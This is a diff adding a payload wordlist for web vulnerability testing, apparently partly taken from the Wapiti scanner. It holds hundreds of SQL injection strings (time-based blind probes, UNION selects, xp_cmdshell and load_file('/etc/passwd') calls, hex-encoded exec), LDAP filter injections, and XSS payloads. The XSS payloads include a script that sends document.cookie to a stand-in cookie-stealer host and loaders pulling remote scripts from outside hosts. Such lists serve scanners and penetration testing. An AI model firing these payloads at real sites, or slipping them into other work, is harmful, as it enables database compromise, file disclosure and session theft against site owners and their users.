@@ -1,0 +1,461 @@
+# from wapiti
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+' or sleep(__TIME__)#
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
+)%20or%20('x'='x
+%20or%201=1
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+update
+";waitfor delay '0:0:__TIME__'--
+1) or pg_sleep(__TIME__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+"hi"") or (""a""=""a"
+delete
+like
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+insert
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+*|
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+"a"" or 3=3--"
+" or benchmark(10000000,MD5(1))#
+# from wapiti
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+0
+21 %
+limit
+ or 1=1
+ or 2 > 1
+")) or benchmark(10000000,MD5(1))#
+PRINT
+hi') or ('a'='a
+ or 3=3
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+or%201=1
+1 or sleep(__TIME__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 'text' = n'text'
+ --
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+exec xp
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+3.10E+17
+" or pg_sleep(__TIME__)--
+x' AND email IS NULL; --
+&
+admin' or '
+ or 'unusual' = 'unusual'
+//
+truncate
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+declare @s varchar(200) select @s = 0x77616974 ...
+tz_offset
+sqlvuln
+"));waitfor delay '0:0:__TIME__'--
+||6
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+or a=a
+) union select * from information_schema.tables;
+PRINT @@variable
+or isNULL(1/0) /*
+26 %
+" or "a"="a
+(sqlvuln)
+x' AND members.email IS NULL; --
+ or 1=1--
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+0x770061006900740066006F0072002000640065006C00 ...
+%20'sleep%2050'
+as
+1)) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=/**/1
+ union all select @@version--
+,@variable
+(sqlattempt2)
+ or (EXISTS)
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+%20$(sleep%2050)
+1 or benchmark(10000000,MD5(1))#
+%20or%20''='
+||UTL_HTTP.REQUEST
+ or pg_sleep(__TIME__)--
+hi' or 'x'='x';
+") or sleep(__TIME__)="
+ or 'whatever' in ('whatever')
+; begin declare @var varchar(8000) set @var=' ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
+0x77616974666F722064656C61792027303A303A313027 ...
+exec(@s)
+) or pg_sleep(__TIME__)--
+ union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(__TIME__)='
+ or 1 --'
+or 0=0 #"
+having
+a'
+" or isNULL(1/0) /*
+declare @s varchar (8000) select @s = 0x73656c ...
+â or 1=1 --
+char%4039%41%2b%40SELECT
+order by
+bfilename
+ having 1=1--
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:__TIME__'--
+" or 1=1--
+x' AND userid IS NULL; --
+*/*
+ or 'text' > 't'
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+a' or 3=3--
+ -- &password=
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+select
+")) or sleep(__TIME__)="
+0x730065006c0065006300740020004000400076006500 ...
+hi' or 1=1 --
+") or pg_sleep(__TIME__)--
+%20or%20'x'='x
+ or 'something' = 'some'+'thing'
+exec sp
+29 %
+(
+Ã½ or 1=1 --
+1 or pg_sleep(__TIME__)--
+0 or 1=1
+) or (a=a
+uni/**/on sel/**/ect
+replace
+%27%20or%201=1
+)) or pg_sleep(__TIME__)--
+%7C
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+&apos;%20OR
+; or '1'='1'
+declare @q nvarchar (200) select @q = 0x770061 ...
+1 or 1=1
+; exec ('sel' + 'ect us' + 'er')
+23 OR 1=1
+/
+anything' OR 'x'='x
+declare @q nvarchar (4000) select @q =
+or 0=0 --
+desc
+||'6
+)
+1)) or sleep(__TIME__)#
+or 0=0 #
+ select name from syscolumns where id = (sele ...
+hi or a=a
+*(|(mail=*))
+password:*/=1--
+distinct
+);waitfor delay '0:0:__TIME__'--
+to_timestamp_tz
+") or benchmark(10000000,MD5(1))#
+ UNION SELECT
+%2A%28%7C%28mail%3D%2A%29%29
++sqlvuln
+ or 1=1 /*
+)) or sleep(__TIME__)='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+sqlvuln;
+ union select * from users where login = char ...
+x' or 1=1 or 'x'='y
+28 %
+â or 3=3 --
+@variable
+ or '1'='1'--
+"a"" or 1=1--"
+//*
+%2A%7C
+" or 0=0 --
+")) or pg_sleep(__TIME__)--
+?
+ or 1/*
+!
+'
+ or a = a
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or 1=1
+ or 1=1 --
+x' OR full_name LIKE '%Bob%
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'%20or%20''='
+'%20or%20'x'='x
+')%20or%20('x'='x
+' or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+' or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+or
+procedure
+handler
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+<>"'%;)(&+
+'%20or%201=1
+'sqlattempt1
+%28
+%29
+%26
+%21
+' or ''='
+' or 3=3
+ or 3=3 --
+"><script>"
+<script>alert("WXSS")</script>
+<<script>alert("WXSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('WXSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC="javascript:alert('WXSS');">
+<IMG%20SRC="javascript:alert('WXSS')"
+<IMG%20SRC=javascript:alert('WXSS')>
+<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+<IMG%20SRC=`javascript:alert("'WXSS'")`>
+<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC="jav	ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
+<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
+<IMG%20DYNSRC="javascript:alert('WXSS')">
+<IMG%20LOWSRC="javascript:alert('WXSS')">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()}
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)//
+<script>alert(1)<!–
+<script src=//brutelogic.com.br/1.js>
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1)
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
+<x onxxx%3D1
+<X onxxx=1
+<x OnXxx=1
+<X OnXxx=1
+<x onxxx=1 onxxx=1
+<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1
+<x 1='1'onxxx=1
+<x 1="1"onxxx=1
+<x </onxxx=1
+<x 1=">" onxxx=1
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+<script>alert(1)</script>
+<script src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchcancel=alert(1)>
+<body onorientationchange=alert(1)>
+"><img src=1 onerror=alert(1)>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+<script src="data:&comma;alert(1)//
+"><script src=data:&comma;alert(1)//
+<script src="//brutelogic.com.br&sol;1.js&num;
+"><script src=//brutelogic.com.br&sol;1.js&num;
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<base href=//0>
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
